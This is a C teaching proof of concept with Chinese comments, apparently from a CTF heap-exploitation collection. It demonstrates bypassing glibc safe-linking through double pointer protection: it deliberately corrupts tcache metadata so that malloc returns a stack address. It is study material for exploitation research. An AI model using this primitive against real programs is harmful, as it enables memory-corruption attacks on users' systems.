/*
 * 中文导读（CTF 版）
 *
 * 手法：safe_linking
 * 文件标注范围：double ~ protect ~ 2.32 ~ 2.41
 * 模拟漏洞：泄露一个受保护单链指针，或能让同一指针经历两次 PROTECT_PTR。
 * 核心流程：解密 PoC 逐 12 位恢复地址；double-protect PoC 利用 xor 自反性把已知目标重新变成可用链指针。
 * 成功判据：恢复出的地址/最终分配地址与真实值相等。它是 2.32+ tcache/fastbin 攻击的配套原语。
 *
 * 阅读约定：malloc 返回的是 user data；源码里 p[-1] 通常是 size，p[-2]
 * 是 prev_size。所有故意的 UAF、越界和 double free 都是漏洞模拟，不是正常 C 用法。
 * 版本范围以本目录 README 和验证矩阵为准；发行版回移补丁时应按实际 libc 源码判断。
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>

/*
 * 本手法利用异或自反性，在不知道 safe-linking key 的情况下盲绕过 glibc
 * 2.32 引入的单链保护。引入提交：
 * https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=a1a486d70ebcc47a686ff5846875eacad0940e41
 *
 * PROTECT_PTR(storage, ptr) 的核心是 ptr ^ (storage >> 12)，并在取链时检查
 * 返回地址的 malloc 对齐。如果让一个已经按某 storage 保护过的值再次经过
 * 相同 key 的保护，则：
 *
 *     双重保护恒等式：(ptr ^ key) ^ key = ptr。
 *
 * PoC 先让一个 tcache bin 指向保存目标明文的堆块，使该值成为一次保护后的
 * next；再通过直接控制 tcache 元数据，让另一个 bin 把“存放密文的位置”
 * 当作链节点，分配器第二次异或后恢复目标地址。所需核心原语是能够修改
 * tcache_perthread_struct 的 entries；House of Water 正好可提供这种能力。
 *
 * 若只有普通任意写，目标最低半字节受 0x10 对齐与 ASLR 影响，通常仍需爆破
 * 4 位；若漏洞能逐步递增整数，可枚举而不依赖崩溃重启。
 * 技术作者：@udp_ctf（Water Paddler / Blue Water）。
 */

int main(void) {
	// 关闭 stdio 缓冲，防止 _IO_FILE 的隐式堆分配改变 tcache 元数据所在页。
	setbuf(stdin, NULL);
	setbuf(stdout, NULL);
	setbuf(stderr, NULL);

	// 栈上 goal 是最终任意分配目标；成功后 vuln 指针会覆盖这段字符串。
	char goal[] = "Replace me!";

	// 第一步：为两个不同尺寸的 tcache bin 各准备两块链节点。
	
	// 申请两个 0x38 用户块，对应 0x40 tcache；该 bin 保存第一次保护后的值。
	void *a = malloc(0x38);
	void *b = malloc(0x38);

	// 再申请两个 0x18 用户块，对应 0x20 tcache；该 bin 用来执行第二次保护。
	void *c = malloc(0x18);
	void *d = malloc(0x18);

	// 第二步：在一个普通堆块中保存目标明文；实战也可利用堆上已有的目标指针。

	// value 块的首机器字保存对齐后的 goal 地址，稍后它会被当作 tcache next。
	void *value = malloc(0x28);
	// 清除最低 4 位以满足 malloc 0x10 对齐检查；否则 tcache_get 会报 unaligned chunk。
	*(long *)value = ((long)(goal) & ~(0xf));

	// 第三步：释放两组块，在两个尺寸 bin 中各建立长度为 2 的正常 tcache 链。

	// 依次释放 a、b，得到 0x40 tcache：b -> a。
	free(a);
	free(b);

	// 依次释放 c、d，得到 0x20 tcache：d -> c。
	free(c);
	free(d);

	// 第四步：使用 tcache 元数据写原语重定向两个 bin，完成两层保护的嵌套。
	
	// 本演示布局中 tcache 元数据位于 value 所在页起点；真题应由堆泄漏或 House of Water 定位。
	void *metadata = (void *)((long)(value) & ~(0xfff));

	// 改写 0x40 tcache 的 entries，使链头落到保存 goal 明文的 value 块。
	*(unsigned int*)(metadata+0xa0) = (long)(metadata)+((long)(value) & (0xfff));

	void *_ = malloc(0x38);

	/* 漏洞模拟开始/结束 */	
	*(unsigned int*)(metadata+0x90) = (long)(metadata)+0xa0;

	/* 漏洞模拟开始/结束 */	

	// 第五步：从被重定向的 0x20 bin 申请两次，第二次应返回目标地址。
	
	_ = malloc(0x18);

	char *vuln = malloc(0x18);

	// 第六步：通过返回的 vuln 写栈上 goal，并断言字符串确实发生变化。
	strcpy(vuln, "XXXXXXXXXXX HIJACKED!");

	assert(strcmp(goal, "Replace me!") != 0);
}
